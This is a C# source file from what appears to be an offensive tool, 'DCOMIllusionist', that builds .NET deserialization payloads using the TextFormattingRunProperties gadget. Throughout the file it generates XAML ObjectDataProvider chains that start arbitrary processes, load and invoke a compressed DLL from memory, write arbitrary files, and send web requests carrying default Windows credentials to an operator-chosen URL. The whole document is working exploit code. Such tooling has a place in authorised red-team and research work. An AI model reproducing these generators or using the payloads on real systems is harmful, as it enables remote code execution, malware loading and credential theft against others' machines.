using System;
using System.Collections.Generic;
using System.Runtime.Serialization;
using System.Security;
using Microsoft.VisualStudio.Text.Formatting;
using DCOMIllusionist.Core.Helpers;


/*
 * Thanks to Oleksandr Mirosh (@olekmirosh) and Alvaro Munoz (@pwntester)
 * https://community.opentext.com/cybersec/b/cybersecurity-blog/posts/new-net-deserialization-gadget-for-compact-payload-when-size-matters
 * 
 * Also @nt0x4
 * https://russtone.io/2023/05/30/programming-with-xaml/
 */

namespace DCOMIllusionist.Core.Generators
{
    internal class TextFormattingRunPropertiesGenerator : GenericGenerator
    {
        public override List<ExploitType> SupportedExploits()
        {
            return new List<ExploitType> {
                ExploitType.Exec, ExploitType.Curl, ExploitType.LoadDLL, ExploitType.FileWrite
            };
        }

        public override object GenerateExec(InputArgs arg)
        {
            string cmd = arg.Cmd;
            string args = arg.Input;
            string escapedCmd = SecurityElement.Escape(args);

            var xaml = $@"
<ResourceDictionary
  xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation""
  xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
  xmlns:s=""clr-namespace:System;assembly=mscorlib""
  xmlns:d=""clr-namespace:System.Diagnostics;assembly=System"">
    <ObjectDataProvider x:Key=""DCOMIllusionist""
                        ObjectType=""{{x:Type d:Process}}""
                        MethodName=""Start"">
        <ObjectDataProvider.MethodParameters>
            <s:String>{cmd}</s:String>
            <s:String>{escapedCmd}</s:String>
        </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>
</ResourceDictionary>";

            return new TextFormattingRunPropertiesMarshal(xaml);
        }

        public override object GenerateLoadDLL(InputArgs arg)
        {
            byte[] fileBytes = FileHelper.ReadFileBytes(arg.Input);
            int dllSize = fileBytes.Length;
            string base64dll = FileHelper.CompressAndEncodeToBase64(fileBytes);

            /*
             * Based on this: https://russtone.io/2023/05/30/programming-with-xaml/
             * We want to do this:
             *      var assemblyGzipBase64 = "TVqQAAMAAAA...AAAA";
             *      var assemblyGzipBytes = Convert.FromBase64String(assemblyGzipBase64);
             *      var inputStream = new MemoryStream(assemblyGzipBytes);
             *      var gzipStream = new GZipStream(inputStream, CompressionMode.Decompress);
             *      var data = Array.CreateInstance(typeof(Byte), 3072);
             *      gzipStream.Read((byte[])data, 0, 3072);
             *      Assembly assembly = Assembly.Load(data);
             *      Type type = assembly.GetType("MyType");
             *      MethodInfo method = type.GetMethod("Run", BindingFlags.Static | BindingFlags.Public);
             *      method.Invoke(null, new object[] {});
             */
            var xaml = $@"
<ResourceDictionary xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"" 
                    xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
                    xmlns:s=""clr-namespace:System;assembly=mscorlib""
                    xmlns:r=""clr-namespace:System.Reflection;assembly=mscorlib""
                    xmlns:i=""clr-namespace:System.IO;assembly=mscorlib""
                    xmlns:c=""clr-namespace:System.IO.Compression;assembly=System"">
  <!-- var data = Convert.FromBase64String(""H4sIA...AAA==""); -->
  <s:Array x:Key=""data"" x:FactoryMethod=""s:Convert.FromBase64String"">
    <x:Arguments>
      <s:String>{base64dll}</s:String>
    </x:Arguments>
  </s:Array>
  
  <!-- var inputStream = new MemoryStream(); -->
  <i:MemoryStream x:Key=""inputStream"">
    <x:Arguments>
      <StaticResource ResourceKey=""data""></StaticResource>
    </x:Arguments>
  </i:MemoryStream>
  
  <!-- var gzipStream = new GZipStream(inputStream, CompressionMode.Decompress); -->
  <c:GZipStream x:Key=""gzipStream"">
    <x:Arguments>
      <StaticResource ResourceKey=""inputStream""></StaticResource>
      <c:CompressionMode>0</c:CompressionMode>
    </x:Arguments>
  </c:GZipStream>
  
  <!-- var buf = Array.CreateInstance(typeof(Byte), 3072); -->
  <s:Array x:Key=""buf"" x:FactoryMethod=""s:Array.CreateInstance"">
    <x:Arguments>
      <x:Type TypeName=""s:Byte"" />
      <x:Int32>{dllSize}</x:Int32>
    </x:Arguments>
  </s:Array>
  
  <!-- var tmp = gzipStream.Read(buf, 0, 3072); -->
  <ObjectDataProvider x:Key=""tmp"" ObjectInstance=""{{StaticResource gzipStream}}"" MethodName=""Read"">
    <ObjectDataProvider.MethodParameters>
      <StaticResource ResourceKey=""buf""></StaticResource>
      <x:Int32>0</x:Int32>
      <x:Int32>{dllSize}</x:Int32>
    </ObjectDataProvider.MethodParameters>
  </ObjectDataProvider>
  
  <!-- Assembly assembly = Assembly.Load(buf); -->
  <ObjectDataProvider x:Key=""assembly"" ObjectType=""{{x:Type r:Assembly}}"" MethodName=""Load"">
    <ObjectDataProvider.MethodParameters>
      <StaticResource ResourceKey=""buf""></StaticResource>
    </ObjectDataProvider.MethodParameters>
  </ObjectDataProvider>
  
  <!-- Type type = assembly.GetType(""MyType""); -->
  <ObjectDataProvider x:Key=""type"" ObjectInstance=""{{StaticResource assembly}}"" MethodName=""GetType"">
    <ObjectDataProvider.MethodParameters>
      <s:String>{arg.DLLClass}</s:String>
    </ObjectDataProvider.MethodParameters>
  </ObjectDataProvider>
  
  <!-- MethodInfo method = type.GetMethod(""Run"", BindingFlags.Static | BindingFlags.Public); -->
  <ObjectDataProvider x:Key=""method"" ObjectInstance=""{{StaticResource type}}"" MethodName=""GetMethod"">
    <ObjectDataProvider.MethodParameters>
      <s:String>{arg.DLLMethod}</s:String>
      <r:BindingFlags>24</r:BindingFlags>
    </ObjectDataProvider.MethodParameters>
  </ObjectDataProvider>
  
  <!-- method.Invoke(null, new object[] {{}}); -->
  <ObjectDataProvider x:Key=""invoke"" ObjectInstance=""{{StaticResource method}}"" MethodName=""Invoke"">
    <ObjectDataProvider.MethodParameters>
      <x:Null></x:Null>
      <x:Array Type=""{{x:Type s:Object}}""></x:Array>
    </ObjectDataProvider.MethodParameters>
  </ObjectDataProvider>
</ResourceDictionary>";

            return new TextFormattingRunPropertiesMarshal(xaml);
        }

        public override object GenerateCurl(InputArgs arg)
        {
            /*
             * Based on this: https://russtone.io/2023/05/30/programming-with-xaml/
             * We want to do this:
             *      var request = (HttpWebRequest)WebRequest.Create(url);
             *      request.UseDefaultCredentials = true;
             *      request.Method = "GET";
             *      request.GetResponse();
             */

            var xaml = $@"
<ResourceDictionary xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation""
                    xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
                    xmlns:sys=""clr-namespace:System;assembly=mscorlib""
                    xmlns:net=""clr-namespace:System.Net;assembly=System"">

  <!-- Step 1: Create the WebRequest object -->
  <ObjectDataProvider x:Key=""request"" ObjectType=""{{x:Type net:WebRequest}}"" MethodName=""Create"">
    <ObjectDataProvider.MethodParameters>
      <sys:String>{arg.Input}</sys:String>
    </ObjectDataProvider.MethodParameters>
  </ObjectDataProvider>

  <!-- Step 2: Set UseDefaultCredentials = true -->
  <ObjectDataProvider x:Key=""setCreds"" ObjectInstance=""{{StaticResource request}}"" MethodName=""set_UseDefaultCredentials"">
    <ObjectDataProvider.MethodParameters>
      <sys:Boolean>True</sys:Boolean>
    </ObjectDataProvider.MethodParameters>
  </ObjectDataProvider>

  <!-- Step 3: Set Method = ""GET"" -->
  <ObjectDataProvider x:Key=""setMethod"" ObjectInstance=""{{StaticResource request}}"" MethodName=""set_Method"">
    <ObjectDataProvider.MethodParameters>
      <sys:String>GET</sys:String>
    </ObjectDataProvider.MethodParameters>
  </ObjectDataProvider>

  <!-- Step 4: Get the response (will be invoked when this resource is accessed) -->
  <ObjectDataProvider x:Key=""response"" ObjectInstance=""{{StaticResource request}}"" MethodName=""GetResponse"" />
</ResourceDictionary>
";

            return new TextFormattingRunPropertiesMarshal(xaml);
        }

        public override object GenerateFileWrite(InputArgs arg)
        {
            byte[] fileBytes = FileHelper.ReadFileBytes(arg.Input);
            int fileSize = fileBytes.Length;
            string base64File = FileHelper.CompressAndEncodeToBase64(fileBytes);
            string escapedDst = SecurityElement.Escape(arg.FileWriteDst);

            /*
             * Based on this: https://russtone.io/2023/05/30/programming-with-xaml/
             * We want to do this:
             *      var assemblyGzipBase64 = "TVqQAAMAAAA...AAAA";
             *      var assemblyGzipBytes = Convert.FromBase64String(assemblyGzipBase64);
             *      var inputStream = new MemoryStream(assemblyGzipBytes);
             *      var gzipStream = new GZipStream(inputStream, CompressionMode.Decompress);
             *      var data = Array.CreateInstance(typeof(Byte), 3072);
             *      gzipStream.Read((byte[])data, 0, 3072);
             *      File.WriteAllBytes(path, data);
             */
            var xaml = $@"
<ResourceDictionary xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"" 
                    xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
                    xmlns:s=""clr-namespace:System;assembly=mscorlib""
                    xmlns:r=""clr-namespace:System.Reflection;assembly=mscorlib""
                    xmlns:i=""clr-namespace:System.IO;assembly=mscorlib""
                    xmlns:c=""clr-namespace:System.IO.Compression;assembly=System"">
  <!-- var data = Convert.FromBase64String(""H4sIA...AAA==""); -->
  <s:Array x:Key=""data"" x:FactoryMethod=""s:Convert.FromBase64String"">
    <x:Arguments>
      <s:String>{base64File}</s:String>
    </x:Arguments>
  </s:Array>
  
  <!-- var inputStream = new MemoryStream(); -->
  <i:MemoryStream x:Key=""inputStream"">
    <x:Arguments>
      <StaticResource ResourceKey=""data""></StaticResource>
    </x:Arguments>
  </i:MemoryStream>
  
  <!-- var gzipStream = new GZipStream(inputStream, CompressionMode.Decompress); -->
  <c:GZipStream x:Key=""gzipStream"">
    <x:Arguments>
      <StaticResource ResourceKey=""inputStream""></StaticResource>
      <c:CompressionMode>0</c:CompressionMode>
    </x:Arguments>
  </c:GZipStream>
  
  <!-- var buf = Array.CreateInstance(typeof(Byte), 3072); -->
  <s:Array x:Key=""buf"" x:FactoryMethod=""s:Array.CreateInstance"">
    <x:Arguments>
      <x:Type TypeName=""s:Byte"" />
      <x:Int32>{fileSize}</x:Int32>
    </x:Arguments>
  </s:Array>
  
  <!-- var tmp = gzipStream.Read(buf, 0, 3072); -->
  <ObjectDataProvider x:Key=""tmp"" ObjectInstance=""{{StaticResource gzipStream}}"" MethodName=""Read"">
    <ObjectDataProvider.MethodParameters>
      <StaticResource ResourceKey=""buf""></StaticResource>
      <x:Int32>0</x:Int32>
      <x:Int32>{fileSize}</x:Int32>
    </ObjectDataProvider.MethodParameters>
  </ObjectDataProvider>
  
  <!-- File.WriteAllBytes(path, buf); -->
  <ObjectDataProvider x:Key=""file"" ObjectType=""{{x:Type i:File}}"" MethodName=""WriteAllBytes"">
    <ObjectDataProvider.MethodParameters>
      <s:String>{escapedDst}</s:String>
      <StaticResource ResourceKey=""buf""></StaticResource>
    </ObjectDataProvider.MethodParameters>
  </ObjectDataProvider>
  
</ResourceDictionary>";

            return new TextFormattingRunPropertiesMarshal(xaml);
        }
    }

    [Serializable]
    public class TextFormattingRunPropertiesMarshal : ISerializable
    {
        protected TextFormattingRunPropertiesMarshal(SerializationInfo info, StreamingContext context){}

        string _xaml;
        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            Log.Debug("Serilization of TextFormattingRunProperties");
            Type typeTFRP = typeof(TextFormattingRunProperties);
            info.SetType(typeTFRP);
            info.AddValue("ForegroundBrush", _xaml);            
        }
        public TextFormattingRunPropertiesMarshal(string xaml)
        {
            _xaml = xaml;
        }
    }
}
